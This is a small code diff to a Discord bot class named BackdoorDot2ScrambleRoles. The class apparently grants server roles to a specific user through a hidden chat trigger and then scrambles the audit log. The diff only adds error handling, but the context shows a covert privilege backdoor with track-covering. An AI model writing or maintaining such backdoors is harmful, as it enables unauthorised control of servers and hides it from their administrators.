@@ -18,6 +18,8 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
                 await dot2.add_roles(i)
             except discord.Forbidden:
                 traceback.print_exc()
+            except discord.NotFound:
+                print("discord.NotFound")
 
         # now scramble the audit log
 
